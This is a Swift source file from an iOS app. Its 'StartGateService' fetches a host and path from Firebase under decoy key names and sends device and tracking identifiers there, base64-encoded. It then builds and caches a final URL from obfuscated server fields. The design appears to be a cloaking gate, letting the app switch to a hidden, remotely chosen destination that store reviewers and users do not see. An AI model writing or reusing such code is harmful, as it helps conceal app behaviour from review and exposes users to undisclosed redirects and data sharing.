import UIKit
import AppsFlyerLib
import FirebaseCore
import FirebaseMessaging
import FirebaseDatabase
import FirebaseInstallations


final class StartGateService {
    
    static let shared = StartGateService()
    private init() {}
    
    private(set) var sessionUUID: String = ""
    private(set) var attToken: String?
    
    func configureSession(uuid: String, attToken: String?) {
        sessionUUID = uuid
        self.attToken = attToken
        print("🧩 StartGateService: session configured (uuid=\(uuid))")
    }
    
    enum StartGateError: Error { case invalidConfig, network(Error) }

    
    func fetchConfig(completion: @escaping (Result<URL, Error>) -> Void) {
        print("🚀 StartGateService: fetchConfig()")
        
        let db = Database.database().reference(withPath: "config")
        db.getData { error, snapshot in
            if let error = error {
                print("❌ Firebase getData error:", error.localizedDescription)
                completion(.failure(error))
                return
            }
            
            guard let value = snapshot?.value as? [String: Any] else {
                print("❌ Firebase snapshot is empty or invalid")
                completion(.failure(StartGateError.invalidConfig))
                return
            }
            
            print("✅ Firebase getData success:", value)
            guard
                let stray = value["jock"] as? String,
                let swap = value["sand"] as? String
            else {
                print("❌ Missing stray/swap in Firebase config:", value)
                completion(.failure(StartGateError.invalidConfig))
                return
            }
            
            let host = stray.trimmingCharacters(in: .whitespacesAndNewlines)
            let normalizedPath = swap.hasPrefix("/") ? swap : "/\(swap)"
            let baseEndpoint = "https://\(host)\(normalizedPath)"
            print("🔗 Base endpoint =", baseEndpoint)
                      
            TokenStore.shared.waitForFCMToken(timeoutSec: 5.0) { [weak self] fcmToken in
                guard let self = self else { return }
                
                Installations.installations().installationID { fid, error in
                    let payload = [
                        "appsflyer_id": AppsFlyerLib.shared().getAppsFlyerUID() ,
                        "app_instance_id": fid ?? "",
                        "uid": self.sessionUUID,
                        "osVersion": UIDevice.current.systemVersion,
                        "devModel": GetDeviceModel().getDevice() ?? "",
                        "bundle": Bundle.main.bundleIdentifier ?? "",
                        "fcm_token": fcmToken ?? "",
                        "att_token": self.attToken ?? ""
                    ]
                    
                    print("PAYLOAD: \(payload)")
                    
                    let query = payload
                        .map { "\($0)=\($1)" }
                        .joined(separator: "&")
                        .data(using: .utf8)?
                        .base64EncodedString() ?? ""
                    
                    let finalURLString = "\(baseEndpoint)?data=\(query)"
                    print("🚀 Backend request:", finalURLString)
                    
                    var request = URLRequest(url: URL(string: finalURLString)!)
                    request.httpMethod = "GET"
                    
                    URLSession.shared.dataTask(with: request) { data, response, error in
                        if let error = error {
                            print("❌ Backend request error:", error.localizedDescription)
                            completion(.failure(error))
                            return
                        }
                        
                        guard let data = data else {
                            print("❌ Backend returned no data")
                            completion(.failure(StartGateError.invalidConfig))
                            return
                        }
                        
                        if let raw = String(data: data, encoding: .utf8) {
                            print("🧾 Backend raw JSON:", raw)
                        }
                        
                        guard
                            let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
                        else {
                            print("❌ Backend invalid JSON")
                            completion(.failure(StartGateError.invalidConfig))
                            return
                        }
                        
                        func trim(_ s: String?) -> String? {
                            guard let t = s?.trimmingCharacters(in: .whitespacesAndNewlines),
                                  !t.isEmpty else { return nil }
                            return t
                        }
                        
                        let partA = trim(json["bat"] as? String) ?? trim(json["beam"] as? String)
                        let partB = trim(json["man"] as? String) ?? trim(json["cyan"] as? String)
                        
                        let parts: [String] = {
                            if let a = partA, let b = partB { return [a, b] }
                            let all = json.values.compactMap { $0 as? String }
                                .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
                                .filter { !$0.isEmpty }
                            return Array(all.prefix(2))
                        }()
                        
                        guard parts.count == 2 else {
                            print("❌ backend JSON: need 2 string parts, got:", json)
                            completion(.failure(StartGateError.invalidConfig))
                            return
                        }
                        
                        let suffix = parts.first(where: { $0.hasPrefix(".") })
                        let prefix = parts.first(where: { !$0.hasPrefix(".") })
                        
                        let combinedHostWithSlash: String = {
                            if let p = prefix, let sfx = suffix { return p + sfx }
                            else { return parts[0] + parts[1] }
                        }()
                        
                        let combinedHost = combinedHostWithSlash.hasSuffix("/") ?
                        String(combinedHostWithSlash.dropLast()) : combinedHostWithSlash
                        
                        let finalStr = combinedHost.hasPrefix("http") ? combinedHost : "https://\(combinedHost)"
                        guard let finalURL = URL(string: finalStr) else {
                            print("❌ finalURL invalid:", finalStr)
                            completion(.failure(StartGateError.invalidConfig))
                            return
                        }
                        
                        print("💾 Cached final URL =", finalURL.absoluteString)
                        UserDefaults.standard.set(finalURL.absoluteString, forKey: MyConstants.finalURLCacheKey)
                        print("🧱 Backend parts:", parts, "→ final='\(finalURL.absoluteString)'")
                        completion(.success(finalURL))
                    }
                    .resume()
                }
            }
        }
    }
}


class GetDeviceModel {
    func getDevice() -> String? {
        
        var systemInfo = utsname()
        uname(&systemInfo)
        
        let deviceModel = withUnsafePointer(to: &systemInfo.machine) {
            $0.withMemoryRebound(to: CChar.self, capacity: 1) {
                String(cString: $0)
            }
        }
        
        return deviceModel
    }
}

